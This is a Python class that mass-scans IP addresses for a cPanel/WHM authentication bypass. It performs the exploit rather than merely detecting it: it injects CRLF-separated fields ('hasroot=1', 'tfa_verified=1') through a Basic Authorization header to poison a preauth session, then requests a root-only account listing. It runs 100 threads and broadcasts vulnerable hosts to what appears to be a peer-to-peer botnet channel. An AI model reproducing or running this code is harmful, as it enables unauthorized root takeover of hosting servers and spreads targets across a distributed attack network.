class CPanelTargetVerifier:
    def __init__(self, configmanager, p2pmanager=None, logger=None):
        self.configmanager = configmanager
        self.p2pmanager = p2pmanager
        self.logger = logger or logging.getLogger("Internal.System.Core.cpanel_verifier")
        self.lock = DeadlockDetectingRLock(name="CPanelTargetVerifier.lock")
        self.verified_targets = {}
        self.session = requests.Session()
        self.session.verify = False

    def _get_canonical_host(self, base_url):
        """Stage 0: Discover the canonical hostname via /openid_connect/cpanelid."""
        try:
            resp = self.session.get(f"{base_url}/openid_connect/cpanelid", allow_redirects=False, timeout=5)
            if resp.status_code == 307 and 'Location' in resp.headers:
                from urllib.parse import urlparse
                return urlparse(resp.headers['Location']).hostname
        except: pass
        return None

    @safe_operation("cpanel_verify")
    def verify_cpanel_vuln(self, ip, port=2087):
        cache_key = hashlib.md5(f"{ip}:{port}".encode()).hexdigest()
        with self.lock:
            if cache_key in self.verified_targets and time.time() - self.verified_targets[cache_key]["ts"] < 3600:
                return True

        base_url = f"https://{ip}:{port}"
        try:
            # Stage 0: Canonical host
            canonical = self._get_canonical_host(base_url)
            if not canonical:
                return False

            # Stage 1: Mint preauth session
            sess = requests.Session()
            sess.verify = False
            preauth = sess.post(f"{base_url}/login/?login_only=1",
                                headers={'Host': canonical},
                                data={'user': 'root', 'pass': 'wrong'},
                                timeout=10)
            whostmgrsession = sess.cookies.get('whostmgrsession')
            if not whostmgrsession:
                return False

            # Stage 2: Inject CRLF (using a minimal payload)
            probe_payload = "root:x\nuser=root\nhasroot=1\ntfa_verified=1\n"
            auth_b64 = base64.b64encode(probe_payload.encode()).decode()
            poison_headers = {'Host': canonical,
                              'Authorization': f'Basic {auth_b64}',
                              'Cookie': f'whostmgrsession={whostmgrsession}'}
            sess.get(base_url, headers=poison_headers, allow_redirects=False, timeout=10)

            # Stage 3: Propagate
            prop_headers = {'Host': canonical, 'Cookie': f'whostmgrsession={whostmgrsession}'}
            prop_resp = sess.get(f"{base_url}/scripts2/listaccts", headers=prop_headers, timeout=10)

            # Stage 4: Check for cpsess token
            if not re.search(r'/cpsess(\d+)', prop_resp.text):
                return False

            # If we get here, the target is vulnerable
            with self.lock:
                self.verified_targets[cache_key] = {"ts": time.time(), "ip": ip, "port": port}
            if self.p2pmanager:
                self.p2pmanager.broadcast("cpanel_vuln_found", {"ip": ip, "port": port, "ts": time.time()})
            return True

        except Exception:
            return False

    def scan_cpanel_targets(self, targets, max_workers=100):
        verified = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self.verify_cpanel_vuln, t.get("ip"), t.get("port", 2087)) for t in targets]
            for future, target in zip(futures, targets):
                try:
                    if future.result():
                        verified.append({"ip": target["ip"], "port": target.get("port", 2087), "service": "cpanel_vuln"})
                except: pass
        return verified

